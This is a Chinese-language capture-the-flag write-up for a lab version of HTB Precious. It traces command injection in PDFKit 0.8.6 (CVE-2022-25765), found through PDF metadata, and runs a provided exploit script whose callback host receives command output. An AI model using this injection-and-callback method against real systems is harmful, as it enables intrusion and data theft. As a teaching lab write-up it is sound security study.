# Precious — Writeup

## 范围

本题复现 HTB Precious 的 Web 初始访问阶段。目标是通过 URL 转 PDF 功能发现并利用 PDFKit 0.8.6 的命令注入，读取 Web 服务账户 `ruby` 可访问的 Flag。

本题只有一个 Web Flag：`/home/ruby/user.txt`。不包含原题后续 SSH 凭据复用、Henry 用户切换或 YAML 反序列化提权。

## 1. 侦察与正常功能

访问 Web 服务：

```bash
curl -i http://<TARGET>:8080/
```

页面提供 URL 输入框。先准备一个自己控制的普通 HTML 页面：

```bash
mkdir -p /tmp/precious-page
printf '<html><body><h1>PDF conversion test</h1></body></html>' > /tmp/precious-page/index.html
cd /tmp/precious-page
python3 -m http.server 8000
```

将 `http://<ATTACKBOX-IP>:8000/` 提交给转换服务，下载返回的 PDF。先确认普通转换功能确实可用，而不是一开始就猜测漏洞入口。

## 2. 检查 PDF 元数据

使用 ExifTool：

```bash
exiftool generated.pdf
```

关注 Creator 字段。该环境会显示类似：

```text
Creator : Generated by pdfkit v0.8.6
```

这提供了明确的组件和版本线索。也可以使用 `pdfinfo` 查看 Creator 信息。

## 3. 对照真实漏洞

PDFKit 0.8.6 对 URL source 的处理存在命令注入问题，对应 CVE-2022-25765。

关键不在于 wkhtmltopdf 本身提供了命令执行接口，而在于 PDFKit 构造命令时没有对用户控制的 URL source 做 shell escaping。当前靶机的 `site/app.rb` 将提交的 URL 直接传给 `PDFKit.new(input)`，使用的也是真实 PDFKit 0.8.6。

参考：
- CVE-2022-25765：<https://nvd.nist.gov/vuln/detail/CVE-2022-25765>
- PDFKit 0.8.6 源码：<https://github.com/pdfkit/pdfkit/tree/v0.8.6>
- HTB 原题分析：<https://0xdf.gitlab.io/2023/05/20/htb-precious.html>

## 4. 利用命令注入并读取 Flag

仓库提供独立利用脚本。它在 AttackBox 启动临时 HTTP 服务，再提交精心构造的 URL。PDF 转换器执行命令后，会把命令输出编码进它正常请求的 URL 路径；AttackBox 从请求路径中取回结果，不需要反向 Shell。

确保 AttackBox 与目标之间能够访问指定回连端口，然后执行：

```bash
python3 exploit.py \
  --url http://<TARGET>:8080 \
  --callback-host <ATTACKBOX-IP> \
  --listen-port 9000
```

脚本分两步验证：
1. 执行 `id -un`，确认命令执行身份为 `ruby`；
2. 读取 `/home/ruby/user.txt`，显示取得的 Web Flag。

如果平台网络不允许目标访问 AttackBox 的回连端口，应在靶场私网中允许该回连；不要将靶机服务暴露到公网。

## 5. Flag 与权限边界

本题目标文件为：

```text
/home/ruby/user.txt
```

该文件由 `ruby` 用户拥有，权限为只读（0400）。漏洞命令也以 `ruby` 身份执行，因此能够读取它，但不能据此声称获得 root。

本题只有一个 Web Flag。不要把原版 HTB Precious 后续的 SSH 凭据复用、YAML 反序列化和 sudo Root 链混入当前 Web 专项目标。

## 6. 关键知识点

- 从正常业务功能入手识别攻击面；
- 通过 PDF 元数据识别后端组件与版本；
- 阅读依赖库的命令构造逻辑；
- 区分表单编码、URL 编码与 shell 解释；
- 明确 Web 服务进程的执行身份和文件权限边界。
